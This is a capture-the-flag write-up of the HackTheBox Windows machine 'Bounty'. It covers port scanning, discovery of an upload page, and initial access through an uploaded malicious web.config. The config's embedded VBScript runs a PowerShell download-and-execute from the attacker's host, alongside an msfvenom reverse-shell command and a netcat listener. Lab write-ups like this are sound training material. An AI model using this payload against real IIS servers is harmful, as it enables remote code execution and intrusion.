---
title: "Bounty"
date: 2025-06-09
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Bounty

![](../assets/Pasted%20image%2020250609203557.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.93
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 23:35 CEST
Nmap scan report for 10.10.10.93
Host is up (0.042s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   41.62 ms 10.10.14.1
2   41.92 ms 10.10.10.93

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.88 seconds
```

The only open `port` shows an image of `merlin`.

![](../assets/Pasted%20image%2020250609234035.png)

With `feroxbuster` we discover `/transfer.aspx`.

![](../assets/Pasted%20image%2020250609234456.png)

![](../assets/Pasted%20image%2020250610111729.png)

## Initial Access

I could use a double extension or null byte but can't reach the file, so searching for aspx config files, we can upload a `web.config` one with a reverse shell command.

Create a `msfvenom` reverse shell and start a Python HTTP server and a listener, then upload the `web.config`.

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=5555 -f exe -o reverse.exe
```

```shell
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.17:8000/shell.ps1')")
%>
```

Upon visiting `/uploadedfiles/web.config`, the config will get the `reverse.exe` and execute it.

```shell
$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.93] 49162
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
bounty\merlin
```

Get the flag

## Privilege Escalation

![](../assets/Pasted%20image%2020250610181107.png)

!!! bug

    ABORTED: The user has `SeImpersonatePrivilege` but nothing worked.
